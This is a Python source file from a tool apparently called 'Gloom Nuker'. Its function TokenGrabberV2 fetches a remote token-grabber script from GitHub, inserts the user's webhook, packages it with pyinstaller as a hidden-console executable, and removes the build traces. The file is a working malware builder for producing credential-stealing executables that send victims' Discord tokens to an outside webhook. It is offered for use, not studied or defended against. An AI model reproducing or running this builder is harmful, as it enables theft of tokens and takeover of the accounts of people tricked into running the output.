# Gloom was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Gloom Nuker under the GNU General Public Liscense v2 (1991).

import os
import shutil
import Gloom
import requests
import base64
import random

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from func.plugins.common import setTitle, installPackage

def TokenGrabberV2(WebHook, fileName):
    required = [
        'requests',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'pyinstaller',
        'pillow',
        'wmi',     
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/crxel/Gloom-Grabber/main/GloomGrabber.py").text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", 'w', encoding='utf8', errors="ignore") as f:
        f.write(code)

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")

    os.system(f"pyinstaller --onefile --noconsole {fileName}.py")
    try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(f'{Fore.BLUE}[{Fore.RESET}>>>{Fore.BLUE}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    Gloom.main()
